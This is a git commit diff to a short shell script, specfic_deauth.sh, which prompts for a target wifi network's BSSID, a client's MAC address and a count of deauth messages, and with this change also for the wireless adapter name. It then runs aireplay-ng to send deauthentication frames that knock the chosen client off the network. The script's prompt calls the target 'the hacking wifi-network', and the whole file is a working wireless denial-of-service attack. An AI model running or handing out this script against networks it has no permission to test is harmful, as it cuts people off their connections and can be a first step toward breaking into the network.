2141248389b42f6b7304de16cffa49a40801094b
Srimany123 <58987560+Srimany123@users.noreply.github.com>
2022-12-13 21:29:21 +0530

    Update specfic_deauth.sh

--- specfic_deauth.sh
+++ specfic_deauth.sh
@@ -1,4 +1,5 @@
 read -p "Enter the bssid of the hacking wifi-network: " bssid
 read -p "Enter the mac address of the client to be disconnected: " bssidc
 read -p "Enter the number of deauth messages to be transferred: " deauth
-sudo aireplay-ng --deauth $deauth -c $bssidc -a $bssid wlan0
+read -p "Enter your wifi-adapter name : " Adap
+sudo aireplay-ng --deauth $deauth -c $bssidc -a $bssid $Adap
